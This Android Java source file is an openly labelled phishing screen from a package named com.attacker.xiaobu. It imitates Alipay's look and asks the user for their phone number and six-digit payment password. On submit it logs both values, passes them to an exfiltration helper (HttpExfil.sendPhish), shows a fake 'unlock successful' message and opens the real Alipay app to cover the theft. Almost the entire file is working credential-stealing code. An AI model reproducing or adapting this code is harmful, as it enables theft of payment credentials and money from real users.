package com.attacker.xiaobu;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.InputType;
import android.util.Log;
import android.view.Gravity;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

/**
 * 钓鱼第二层 - 收集手机号+支付密码
 * 使用ScrollView确保所有内容可见
 */
public class PhishInputActivity extends Activity {
    private static final String TAG = "PhishInput";
    private EditText inputPhone;
    private EditText inputPassword;
    private Uri deeplinkUri;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        deeplinkUri = getIntent().getData();

        ScrollView scroll = new ScrollView(this);
        scroll.setFillViewport(true);
        scroll.setBackgroundColor(Color.WHITE);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER_HORIZONTAL);
        root.setBackgroundColor(Color.WHITE);
        root.setPadding(30, 40, 30, 40);

        // 顶部蓝色区域（精简版）
        LinearLayout header = new LinearLayout(this);
        header.setOrientation(LinearLayout.VERTICAL);
        header.setGravity(Gravity.CENTER);
        header.setBackgroundColor(0xFF1677FF);
        header.setPadding(0, 24, 0, 24);
        LinearLayout.LayoutParams hp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        header.setLayoutParams(hp);

        TextView headerTitle = new TextView(this);
        headerTitle.setText("身份验证");
        headerTitle.setTextSize(20);
        headerTitle.setTextColor(Color.WHITE);
        headerTitle.setGravity(Gravity.CENTER);
        headerTitle.setPadding(0, 0, 0, 4);
        header.addView(headerTitle);

        TextView headerSub = new TextView(this);
        headerSub.setText("请输入手机号和支付密码以解锁付款码");
        headerSub.setTextSize(12);
        headerSub.setTextColor(0xCCFFFFFF);
        headerSub.setGravity(Gravity.CENTER);
        header.addView(headerSub);

        root.addView(header);

        // 手机号输入
        TextView phoneLabel = new TextView(this);
        phoneLabel.setText("手机号");
        phoneLabel.setTextSize(14);
        phoneLabel.setTextColor(0xFF333333);
        phoneLabel.setPadding(0, 20, 0, 6);
        root.addView(phoneLabel);

        inputPhone = new EditText(this);
        inputPhone.setHint("请输入支付宝绑定手机号");
        inputPhone.setInputType(InputType.TYPE_CLASS_PHONE);
        inputPhone.setTextSize(15);
        inputPhone.setPadding(20, 14, 20, 14);
        inputPhone.setBackgroundColor(0xFFF5F5F5);
        LinearLayout.LayoutParams ep = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        ep.setMargins(0, 0, 0, 12);
        inputPhone.setLayoutParams(ep);
        root.addView(inputPhone);

        // 密码输入
        TextView pwdLabel = new TextView(this);
        pwdLabel.setText("支付密码");
        pwdLabel.setTextSize(14);
        pwdLabel.setTextColor(0xFF333333);
        pwdLabel.setPadding(0, 0, 0, 6);
        root.addView(pwdLabel);

        inputPassword = new EditText(this);
        inputPassword.setHint("请输入6位数字支付密码");
        inputPassword.setInputType(InputType.TYPE_CLASS_NUMBER | InputType.TYPE_NUMBER_VARIATION_PASSWORD);
        inputPassword.setTextSize(15);
        inputPassword.setPadding(20, 14, 20, 14);
        inputPassword.setBackgroundColor(0xFFF5F5F5);
        LinearLayout.LayoutParams pp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        pp.setMargins(0, 0, 0, 20);
        inputPassword.setLayoutParams(pp);
        root.addView(inputPassword);

        // 解锁按钮（醒目）
        Button btnUnlock = new Button(this);
        btnUnlock.setText("解锁");
        btnUnlock.setTextSize(17);
        btnUnlock.setTextColor(Color.WHITE);
        btnUnlock.setBackgroundColor(0xFF1677FF);
        btnUnlock.setPadding(0, 14, 0, 14);
        LinearLayout.LayoutParams bp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        bp.setMargins(0, 0, 0, 10);
        btnUnlock.setLayoutParams(bp);
        btnUnlock.setOnClickListener(v -> onUnlock());
        root.addView(btnUnlock);

        // 取消按钮
        Button btnCancel = new Button(this);
        btnCancel.setText("取消");
        btnCancel.setTextSize(14);
        btnCancel.setTextColor(0xFF999999);
        btnCancel.setBackgroundColor(Color.TRANSPARENT);
        btnCancel.setOnClickListener(v -> {
            openRealAlipay();
            finish();
        });
        root.addView(btnCancel);

        scroll.addView(root);
        setContentView(scroll);
    }

    private void onUnlock() {
        String phone = inputPhone.getText().toString().trim();
        String password = inputPassword.getText().toString().trim();

        if (phone.isEmpty() || password.isEmpty()) {
            Toast.makeText(this, "请输入手机号和支付密码", Toast.LENGTH_SHORT).show();
            return;
        }

        if (phone.length() != 11) {
            Toast.makeText(this, "请输入11位手机号", Toast.LENGTH_SHORT).show();
            return;
        }

        if (password.length() != 6) {
            Toast.makeText(this, "支付密码必须为6位数字", Toast.LENGTH_SHORT).show();
            return;
        }

        Log.i(TAG, "🚨 收集凭证: phone=" + phone + " password=" + password);

        String uri = deeplinkUri != null ? deeplinkUri.toString() : null;
        HttpExfil.sendPhish(this, phone, password, uri);

        Toast.makeText(this, "解锁成功", Toast.LENGTH_SHORT).show();
        openRealAlipay();
        finish();
    }

    private void openRealAlipay() {
        try {
            Intent intent;
            if (deeplinkUri != null) {
                intent = new Intent(Intent.ACTION_VIEW, deeplinkUri);
            } else {
                intent = new Intent(Intent.ACTION_MAIN);
            }
            intent.setPackage("com.eg.android.AlipayGphone");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            Log.w(TAG, "无法打开真实支付宝: " + e.getMessage());
        }
    }
}
